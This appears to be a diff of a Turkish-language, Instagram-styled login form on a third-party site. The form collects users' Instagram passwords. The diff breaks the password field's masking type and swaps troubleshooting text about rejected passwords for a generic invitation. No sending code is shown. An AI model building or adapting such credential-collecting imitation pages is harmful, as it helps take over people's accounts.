@@ -34,7 +34,7 @@
                               <div class="suggestUsers"><ul></ul></div>
                               </div>
                               <div class="instaclass8 instaclass9">
-                                 <input type="password"  class="instaclass10 instaclass11" aria-describedby="" aria-label="Şifre" aria-required="true" name="pswrd" placeholder="Password" required="">
+                                 <input type=" instagram password"  class="instaclass10 instaclass11" aria-describedby="" aria-label="Şifre" aria-required="true" name="pswrd" placeholder="Password" required="">
                                          <span style="color: black; font-size: 12pt"><input type="checkbox" onclick="myFunction()">Şifreyi göster</span>
                               </div>
                                
@@ -50,10 +50,7 @@
                                    <div class="instaclass20" style="color: black; text-align: left;">
 
                                     <span style='color: red; font-weight: bold;'>Hatalar ve Çözümleri;</span> 1) Giriş işlemleri biraz uzun sürebilir, lütfen bekleyin.(30-60 saniye kadar sürebilir, çok uzun sürmesi halinde sayfayı yenileyip tekrar deneyin) <br>
-                                    2) Giriş yaparken sürekli olarak şifre yanlış uyarısı alıyorsanız instagram.com veya instagram mobil uygulaması üzerinden hesabınıza girip, çıkan uyarıya Bu Bendim diyin ve buradan tekrar giriş yapın.<br>
-                                    3) Instagram şifrenizi bloke edebilir. instagram uygulamasında bulunan şifremi unuttum butonuna tıklayarak yeni şifre alabilirsiniz.<br>
-                                    <a href='https://insmobil.com/blog/instagram-uzgunuz-sifren-yanlisti-sorunu-cozumu' target='_blank' style='color: black; font-weight: bold;'>
-                                    4) Yukarıdaki herşeyi eksiksiz yapmanıza rağmen şifreniz doğru olduğu halde sürekli 'üzgünüz şifreniz yanlıştı' hatası alıyorsanız burayı tıklayın.</a>
+                                    Instagram profilinize dahil olun.</a>
                                 </div>
                            </form>
 
